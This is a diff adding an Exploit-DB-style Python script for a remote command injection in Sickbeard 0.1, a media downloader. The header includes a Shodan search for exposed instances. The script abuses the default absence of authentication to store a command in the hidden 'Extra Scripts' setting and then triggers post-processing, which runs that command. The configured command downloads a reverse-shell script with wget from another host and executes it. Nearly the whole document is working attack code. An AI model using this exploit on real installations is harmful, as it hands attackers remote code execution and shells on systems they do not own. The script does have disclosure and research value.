@@ -1,0 +1,72 @@
+# Exploit Title: Sickbeard 0.1 - Remote Command Injection
+# Google Dork: https://www.shodan.io/search?query=sickbeard
+# Date: 2020-06-06
+# Exploit Author: bdrake
+# Vendor Homepage: https://sickbeard.com/
+# Software Link: https://github.com/midgetspy/Sick-Beard
+# Version: alpha (master) -- git : 31ceaf1b5cab1884a280fe3f4609bdc3b1fb3121
+# Tested on: Fedora 32
+# CVE : NA
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+
+HOST = 'http://localhost:8081/'
+
+# path to local video for processing
+# see HOST + home/postprocess
+PROCESS_DIR = '/directory/changeme'
+
+# Auth is disabled on default installation
+USERNAME = ''
+PASSWORD = ''
+
+# see "Extra Scripts" field. HOST + config/hidden/
+# multiple commands can be entered separated by '|'
+CMD = 'wget -t 2 -T 1 -O /tmp/reverse_shell.py http://localhost/reverse_shell.py | python /tmp/reverse_shell.py'
+
+
+def post_request(url, data):
+    try:
+        requests.post(url=url, data=data, auth=(USERNAME, PASSWORD))
+    except requests.exceptions.RequestException as e:
+        print(repr(e))
+        sys.exit(1)
+
+
+def set_extra_scripts():
+    data = {
+        'anon_redirect': 'http://dereferer.org/?',
+        'display_all_seasons': 'on',
+        'git_path': '',
+        'extra_scripts': CMD
+    }
+
+    post_request(HOST+'config/hidden/saveHidden', data)
+
+
+def process_episode():
+    data = {
+        'dir': PROCESS_DIR,
+        'method': 'Manual',
+        'force_replace': 'on'
+    }
+
+    post_request(HOST+'home/postprocess/processEpisode', data)
+
+
+def main():
+    try:
+        print('setting scripts...')
+        set_extra_scripts()
+
+        print('processing episode. might take a few seconds...')
+        process_episode()
+    except KeyboardInterrupt:
+        print('exit...')
+
+
+if __name__ == '__main__':
+    main()
